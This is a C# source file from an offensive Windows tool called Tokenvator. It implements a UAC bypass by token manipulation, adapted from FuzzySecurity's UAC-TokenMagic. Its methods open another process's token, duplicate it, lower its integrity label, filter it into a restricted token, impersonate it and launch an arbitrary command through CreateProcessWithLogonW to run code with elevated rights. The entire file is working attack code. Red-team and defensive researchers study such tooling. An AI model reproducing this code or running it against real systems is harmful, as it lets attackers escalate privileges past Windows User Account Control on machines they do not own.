using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;

namespace Tokenvator
{
    class RestrictedToken : Tokens
    {
        IntPtr luaToken;

        internal RestrictedToken() : base(false)
        {
            luaToken = new IntPtr();
            Console.WriteLine(" [+] Running as: {0}", WindowsIdentity.GetCurrent().Name);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean BypassUAC(Int32 processId, String command)
        {
            if (GetPrimaryToken((UInt32)processId))
            {
                if (SetTokenInformation())
                {
                    if (ImpersonateUser())
                    {
                        String arguments = String.Empty;
                        FindExe(ref command, out arguments);

                        if (CreateProcess.CreateProcessWithLogonW(phNewToken, command, arguments))
                        {
                            advapi32.RevertToSelf();
                            return true;
                        }
                    }
                    advapi32.RevertToSelf();
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean BypassUAC(IntPtr htoken, String command)
        {
            phNewToken = htoken;
            if (SetTokenInformation())
            {
                if (ImpersonateUser())
                {
                    String arguments = "";
                    if (command.Contains(' '))
                    {
                        String[] commandAndArguments = command.Split(new String[] { " " }, StringSplitOptions.RemoveEmptyEntries);
                        command = commandAndArguments.First();
                        arguments = String.Join(" ", commandAndArguments.Skip(1).Take(commandAndArguments.Length - 1).ToArray());
                    }

                    if (CreateProcess.CreateProcessWithLogonW(phNewToken, command, arguments))
                    {
                        advapi32.RevertToSelf();
                        return true;
                    }
                }
                advapi32.RevertToSelf();
            }
            
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetPrimaryToken(UInt32 processId)
        {
            //Originally Set to true
            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_LIMITED_INFORMATION, false, processId);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine(" [-] Unable to Open Process Token: {0}", processId);
                return false;
            }
            Console.WriteLine("[+] Recieved Handle for: {0}", processId);
            Console.WriteLine(" [+] Process Handle: 0x{0}", hProcess.ToString("X4"));

            try
            {
                if (!kernel32.OpenProcessToken(hProcess, (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
                {
                    Console.WriteLine(" [-] Unable to Open Process Token");
                    return false;
                }
                Console.WriteLine(" [+] Primary Token Handle: 0x{0}", hExistingToken.ToString("X4"));
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }
            finally
            {
                kernel32.CloseHandle(hProcess);
            }

            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)(Constants.TOKEN_ALL_ACCESS),
                        ref securityAttributes,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt._TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetWin32Error("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Existing Token Handle: 0x{0}", hExistingToken.ToString("X4"));
            Console.WriteLine(" [+] New Token Handle: 0x{0}", phNewToken.ToString("X4"));
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean SetTokenInformation()
        {
            Winnt._SID_IDENTIFIER_AUTHORITY pIdentifierAuthority = new Winnt._SID_IDENTIFIER_AUTHORITY();
            pIdentifierAuthority.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 }; //16 - all
            Byte nSubAuthorityCount = 1;
            IntPtr pSID = new IntPtr();
            if (!advapi32.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSID))
            {
                GetWin32Error("AllocateAndInitializeSid: ");
                return false;
            }

            Console.WriteLine(" [+] Initialized SID: 0x{0}", pSID.ToString("X4"));

            Winnt._SID_AND_ATTRIBUTES sidAndAttributes = new Winnt._SID_AND_ATTRIBUTES();
            sidAndAttributes.Sid = pSID;
            sidAndAttributes.Attributes = Constants.SE_GROUP_INTEGRITY_32;
            try
            {
                Winnt._TOKEN_MANDATORY_LABEL tokenMandatoryLabel = new Winnt._TOKEN_MANDATORY_LABEL();
                tokenMandatoryLabel.Label = sidAndAttributes;
                Int32 tokenMandatoryLableSize = Marshal.SizeOf(tokenMandatoryLabel);

                if (0 != ntdll.NtSetInformationToken(phNewToken, 25, ref tokenMandatoryLabel, tokenMandatoryLableSize))
                {
                    GetWin32Error("NtSetInformationToken: ");
                    return false;
                }
                Console.WriteLine(" [+] Set Token Information On: 0x{0}", phNewToken.ToString("X4"));

                if (0 != ntdll.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken))
                {
                    GetWin32Error("NtFilterToken: ");
                    return false;
                }
                Console.WriteLine(" [+] LUA Token Handle: 0x{0}", luaToken.ToString("X4"));
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }
            finally
            {
                advapi32.FreeSid(pSID);
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean ImpersonateUser()
        {
            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        luaToken,
                        (UInt32)(Constants.TOKEN_IMPERSONATE | Constants.TOKEN_QUERY),
                        ref securityAttributes,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt._TOKEN_TYPE.TokenImpersonation,
                        out phNewToken
            ))
            {
                GetWin32Error("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle : 0x{0}", phNewToken.ToString("X4"));
            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
            {
                GetWin32Error("ImpersonateLoggedOnUser: ");
                return false;
            }
            return true;
        }

        public new void Dispose()
        {
            if (IntPtr.Zero != luaToken)
                kernel32.CloseHandle(luaToken);
            base.Dispose();
        }

        ~RestrictedToken()
        {
            Dispose();
        }
    }
}
